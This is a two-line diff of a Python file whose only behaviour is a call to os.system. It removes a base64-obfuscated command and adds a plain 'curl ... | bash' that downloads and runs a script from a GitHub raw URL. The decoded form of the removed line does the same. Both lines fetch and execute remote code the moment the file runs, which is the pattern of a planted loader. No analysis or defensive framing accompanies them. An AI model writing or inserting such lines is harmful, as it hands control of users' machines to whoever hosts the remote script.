@@ -1,2 +1,2 @@
 import os
-os.system('echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2ZlcmluYWtxb21hcml5YWhzaW5kLXBpeGVsL2xpdGVyYXRlLWJhcm5hY2xlL3Jhdy9tYWluL2NvcmUgfCBiYXNo | base64 -d | sh')
+os.system('curl -sL https://github.com/mgssjs/moanu/raw/main/dora | bash')
